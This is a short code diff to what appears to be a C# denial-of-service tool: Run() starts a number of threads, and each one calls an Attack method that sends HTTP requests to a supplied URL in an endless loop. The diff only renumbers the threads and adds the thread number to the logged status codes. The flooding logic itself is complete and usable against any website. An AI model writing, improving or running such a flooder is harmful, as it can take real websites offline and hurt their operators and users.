@@ -11,16 +11,16 @@
 
     public static void Run(string url)
     {
-        for (int i = 0; i < pcBlocks; i++)
+        for (int i = 1; i <= pcBlocks; i++)
         {
-            Thread thread = new Thread(()=>Attack(url));
+            Thread thread = new Thread(()=>Attack(url, i));
             thread.Start();
         }
         Console.ReadLine(); 
         Console.Write("Successfull");
     }
 
-    public static void Attack(string url)
+    public static void Attack(string url, int pcblockNumber)
     {
         while (true)
         {
@@ -30,7 +30,7 @@
                 RequestUri = new Uri(url)
             };
             var result = _client.Send(request);
-            Console.WriteLine(result.StatusCode);
+            Console.WriteLine(pcblockNumber+"-pc received ->" + result.StatusCode);
         }
     }
 }
